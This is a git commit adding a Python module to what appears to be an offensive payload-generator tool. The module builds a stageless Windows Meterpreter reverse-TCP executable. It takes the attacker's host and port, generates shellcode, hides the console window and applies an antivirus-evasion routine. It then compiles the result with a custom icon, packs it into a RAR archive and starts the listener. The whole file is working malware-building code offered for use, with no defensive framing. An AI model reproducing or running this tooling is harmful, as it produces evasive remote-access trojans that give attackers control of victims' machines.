d19c1f3a24674fd4952fcc588132f6440520178d
G1ft3dC0d3 <52042546+G1ft3dC0d3@users.noreply.github.com>
2019-11-08 23:13:13 +0100

    Add files via upload

---
+++ payload/x86_Stageless/Windows/x86_Stageless_Win_Meterpreter_Rev_Tcp.py
@@ -0,0 +1,51 @@
+from lib import evasion, core, gen, body
+
+
+
+def Construction():
+
+    ARCH = "x86"
+    PROTOCOLE = "TCP"
+    TYPE = "Meterpreter"
+    PLATFORM = "Windows"
+    STAGED = "NO"
+
+    RC_PAYLOAD = "windows/meterpreter_reverse_tcp"
+    
+    print(core.amcolors.PURPLE + core.amcolors.BOLD + "[STAGELESS] Payload x86 Meterpreter Reverse TCP" + core.amcolors.ENDC)
+
+    Gen_Payload = True
+
+    while Gen_Payload:
+
+        LHOST = gen.LHOST_Input()
+        LPORT = gen.LPORT_Input()
+        FILENAME = "output/" + gen.FILENAME_Input() + ".exe"
+
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Shellcode generation." + core.amcolors.ENDC)
+
+        PAYLOAD = gen.Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
+
+        Final_Code = body.Start()
+        Final_Code += str(PAYLOAD)
+        Final_Code += body.Hide_Window_Console()
+        Final_Code += evasion.Decoil()
+        Final_Code += body.End()
+
+        with open('source.c', 'w') as f:
+            f.write(Final_Code)
+
+        ICON = gen.Add_Icon()
+
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Compiling + Stripping." + core.amcolors.ENDC)
+
+        gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
+
+        gen.Compress_Rar(FILENAME)
+
+        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)
+
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)
+
+        Gen_Payload = False
